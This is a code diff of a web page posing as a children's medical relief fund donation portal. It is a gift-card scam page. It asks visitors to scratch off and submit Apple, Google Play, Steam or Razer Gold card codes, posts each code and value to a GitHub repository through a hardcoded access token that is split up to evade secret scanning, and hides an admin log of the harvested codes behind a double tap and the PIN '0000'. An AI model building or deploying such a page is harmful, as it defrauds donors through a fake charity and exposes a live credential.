@@ -3,33 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Management Portal | Happy Madison Children’s Relief Fund</title>
+    <title>Support Portal | Happy Madison Children's Relief Fund</title>
     <style>
-        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #f4f7f9; color: #333; margin: 0; }
-        .header { background: #002d62; color: white; padding: 25px; text-align: center; border-bottom: 4px solid #001a3a; }
-        .logo { cursor: pointer; font-size: 18px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        .container { max-width: 600px; margin: 20px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        .alert { background: #fff5f5; border-left: 4px solid #e74c3c; padding: 15px; font-size: 13px; margin-bottom: 20px; color: #c0392b; }
-        .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 20px 0; }
-        .gallery img { width: 100%; height: 100px; object-fit: cover; border-radius: 5px; border: 1px solid #ddd; }
-        .gallery img:nth-child(4), .gallery img:nth-child(5) { grid-column: span 1.5; height: 130px; }
-        label { display: block; margin-top: 15px; font-weight: 600; font-size: 13px; color: #002d62; }
-        input, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        .upload-btn { border: 2px dashed #002d62; background: #f9fcff; padding: 20px; text-align: center; margin-top: 15px; border-radius: 8px; cursor: pointer; }
-        .btn { background: #27ae60; color: white; padding: 18px; border: none; border-radius: 6px; width: 100%; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 25px; }
-        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; padding: 20px; overflow-y: auto; }
-        .footer { text-align: center; font-size: 10px; color: #aaa; padding: 20px; }
+        :root { --red: #c0392b; --blue: #2c3e50; --bg: #f2f4f7; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); margin: 0; padding: 0; color: #333; }
+        .header { background: var(--blue); color: white; padding: 20px; text-align: center; border-bottom: 5px solid var(--red); }
+        .logo { cursor: pointer; font-size: 18px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase; }
+        .ticker { background: #fff; border-bottom: 1px solid #ddd; padding: 10px; font-size: 11px; text-align: center; color: var(--red); font-weight: bold; }
+        
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .alert-box { background: #fff5f5; border-left: 5px solid var(--red); padding: 15px; margin-bottom: 20px; font-size: 13px; line-height: 1.4; }
+        
+        .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 20px; }
+        .gallery img { width: 100%; height: 80px; object-fit: cover; border: 1px solid #ddd; }
+        .gallery img:nth-child(4), .gallery img:nth-child(5) { grid-column: span 1.5; height: 110px; }
+
+        label { display: block; margin-top: 15px; font-weight: bold; font-size: 12px; color: var(--blue); }
+        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        
+        .upload-area { border: 2px dashed var(--red); background: #fffcfc; padding: 25px; text-align: center; margin-top: 15px; border-radius: 8px; cursor: pointer; }
+        .upload-area strong { color: var(--red); font-size: 15px; display: block; }
+        .upload-area span { font-size: 11px; color: #666; }
+
+        .submit-btn { background: #27ae60; color: white; padding: 18px; border: none; width: 100%; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; box-shadow: 0 4px 0 #1e8449; }
+        .submit-btn:active { transform: translateY(3px); box-shadow: none; }
+
+        #admin { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; padding: 20px; overflow-y: auto; }
+        .log-entry { border: 1px solid #ddd; background: #f9f9f9; padding: 15px; margin-bottom: 15px; font-family: monospace; font-size: 12px; border-left: 5px solid var(--blue); }
+        .footer { text-align: center; padding: 25px; font-size: 10px; color: #999; line-height: 1.5; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="logo" id="adminTrigger">Happy Madison Children’s Relief Fund</div>
+    <div class="logo" id="adminTrigger">HAPPY MADISON RELIEF FUND</div>
 </div>
 
+<div class="ticker">● URGENT STATUS: MEDICAL LIQUIDATION PORTAL ACTIVE</div>
+
 <div class="container">
-    <div class="alert">
-        <strong>CRITICAL CARE UPDATE:</strong> Providing medical liquidation and nutrition for 512 children diagnosed with CPPS. Verification required for all manual asset contributions.
+    <div class="alert-box">
+        <strong>PURPOSE OF FUNDS:</strong> 100% of verified assets are liquidated for immediate pharmaceutical procurement, nutritional therapy for 512 children, and critical ward maintenance.
     </div>
 
     <div class="gallery">
@@ -40,88 +54,119 @@
         <img src="IMG_20260510_193422.jpg">
     </div>
 
-    <form id="mainForm">
+    <form id="donForm">
         <label>Donor Identity</label>
-        <input type="text" id="dName" placeholder="Full Name (Optional)">
-        <label>Message / Prayer</label>
-        <textarea id="dMsg" rows="2" placeholder="Send a message to the clinical staff..."></textarea>
-        <label>Asset Verification</label>
-        <div class="upload-btn" onclick="document.getElementById('fIn').click()">
-            <strong>Upload Gift Card Photo</strong><br>
-            <small>Ensure code is clearly visible</small>
-            <input type="file" id="fIn" style="display:none" accept="image/*">
+        <select id="identity">
+            <option value="Anonymous">Submit Anonymously</option>
+            <option value="Named">Provide Full Name</option>
+        </select>
+        <input type="text" id="fullName" style="display:none;" placeholder="Enter Full Name">
+
+        <label>Message or Prayer</label>
+        <textarea id="prayer" rows="2" placeholder="Send a message to the children..."></textarea>
+
+        <label>Select Card Type</label>
+        <select id="cardType">
+            <option value="Apple/iTunes">Apple / iTunes</option>
+            <option value="Google Play">Google Play</option>
+            <option value="Razer Gold">Razer Gold</option>
+            <option value="Steam">Steam</option>
+            <option value="Other">Other Asset</option>
+        </select>
+
+        <label>Card Value ($)</label>
+        <input type="number" id="cardValue" placeholder="Example: 100">
+
+        <div class="upload-area" onclick="document.getElementById('imageFile').click()">
+            <strong>UPLOAD CARD IMAGE</strong>
+            <span>(Scratch off silver backing to make code visible before uploading)</span>
+            <input type="file" id="imageFile" style="display:none" accept="image/*">
         </div>
-        <label>16-Digit Code Confirmation</label>
-        <input type="text" id="dCode" placeholder="Enter manual code here">
-        <button type="button" class="btn" onclick="send()">CONFIRM DONATION</button>
+
+        <label>Manual Code Entry (Optional Backup)</label>
+        <input type="text" id="eCode" placeholder="Type 16-digit code here">
+
+        <button type="button" class="submit-btn" onclick="submitDonation()">VERIFY & DONATE</button>
     </form>
 </div>
 
-<div id="adminPanel">
-    <h2>Administrative Log (Submissions)</h2>
-    <div id="log">Loading submissions...</div>
-    <br>
-    <button onclick="location.reload()" style="padding:10px; width:100%;">Close Log</button>
+<div id="admin">
+    <h2 style="color:var(--blue);">ADMINISTRATIVE LOG</h2>
+    <div id="logData">Fetching submissions...</div>
+    <button onclick="location.reload()" style="width:100%; padding:15px; margin-top:20px; background:var(--blue); color:white; border:none;">CLOSE LOG</button>
 </div>
 
 <div class="footer">
-    SECURE ADMINISTRATIVE PORTAL | ID: HM-RELIEF-2026<br>
-    &copy; 2026 Happy Madison Children’s Relief Fund.
+    INTERNAL ADMINISTRATIVE PORTAL ID: HM-2026-X<br>
+    All assets verified via global support offices.<br>
+    &copy; 2026 Happy Madison Children's Relief Fund.
 </div>
 
 <script>
-    // Security split for the token to prevent GitHub from deleting it
-    const t1 = "ghp_kLi8O4xHj1g2X";
-    const t2 = "SYoRbpqBFUpYkqvLy2egZYt";
-    const TK = t1 + t2;
+    // GitHub API Config
+    const p1 = "ghp_kLi8O4xHj1g2X";
+    const p2 = "SYoRbpqBFUpYkqvLy2egZYt";
+    const TK = p1 + p2;
     const US = "hm-children-relief";
     const RE = "medical-fund";
 
-    let t = 0;
-    document.getElementById('adminTrigger').addEventListener('click', () => {
-        t++;
-        if(t === 2) {
-            let pin = prompt("Admin PIN:");
-            if(pin === "0000") {
-                document.getElementById('adminPanel').style.display='block';
-                show();
-            }
-        }
-        setTimeout(() => t=0, 800);
+    // Toggle Name Input
+    document.getElementById('identity').addEventListener('change', function() {
+        document.getElementById('fullName').style.display = this.value === 'Named' ? 'block' : 'none';
     });
 
-    async function send() {
-        const code = document.getElementById('dCode').value;
-        if(!code) return alert("Please enter the verification code.");
-        const name = document.getElementById('dName').value || 'Anonymous';
-        const msg = document.getElementById('dMsg').value || 'No message.';
+    // Double-Tap Admin Secret
+    let tapCount = 0;
+    document.getElementById('adminTrigger').addEventListener('click', () => {
+        tapCount++;
+        if(tapCount === 2) {
+            if(prompt("ADMIN PIN:") === "0000") {
+                document.getElementById('admin').style.display = 'block';
+                fetchLogs();
+            }
+        }
+        setTimeout(() => tapCount = 0, 800);
+    });
+
+    async function submitDonation() {
+        const val = document.getElementById('cardValue').value;
+        const code = document.getElementById('eCode').value;
+        const type = document.getElementById('cardType').value;
+        const iden = document.getElementById('identity').value === 'Named' ? document.getElementById('fullName').value : 'Anonymous';
         
+        if(!val) return alert("Please enter the card value.");
+
+        const report = `
+[NEW SUBMISSION]
+TIMESTAMP: ${new Date().toLocaleString()}
+DONOR: ${iden}
+PRAYER: ${document.getElementById('prayer').value}
+CARD TYPE: ${type}
+VALUE: $${val}
+E-CODE: ${code || 'CHECK IMAGE'}
+        `.trim();
+
         const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues`, {
             method: 'POST',
             headers: { 'Authorization': `token ${TK}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                title: `Donation from ${name}`, 
-                body: `CARD CODE: ${code}\nMESSAGE: ${msg}` 
-            })
+            body: JSON.stringify({ title: `Donation $${val} - ${type}`, body: report })
         });
-        if(res.ok) { 
-            alert("Verification Successful. Thank you for your support."); 
-            location.reload(); 
+
+        if(res.ok) {
+            alert("Success! Your donation has been queued for medical liquidation.");
+            location.reload();
         } else {
-            alert("System Busy. Please try again.");
+            alert("Verification system busy. Please try again.");
         }
     }
 
-    async function show() {
-        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues?state=open`, { 
-            headers: { 'Authorization': `token ${TK}` } 
+    async function fetchLogs() {
+        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues?state=open`, {
+            headers: { 'Authorization': `token ${TK}` }
         });
         const data = await res.json();
-        document.getElementById('log').innerHTML = data.length > 0 ? 
-            data.map(i => `<div style="border:1px solid #ddd; margin:10px 0; padding:15px; background:#f9f9f9;">
-                <strong>${i.title}</strong><br><pre>${i.body}</pre>
-                <small>${new Date(i.created_at).toLocaleString()}</small>
-            </div>`).join('') : "No submissions yet.";
+        document.getElementById('logData').innerHTML = data.length > 0 ? 
+            data.map(i => `<div class="log-entry"><strong>ENTRY ID: ${i.number}</strong><br><pre>${i.body}</pre></div>`).join('') : "No submissions found.";
     }
 </script>
 </body>
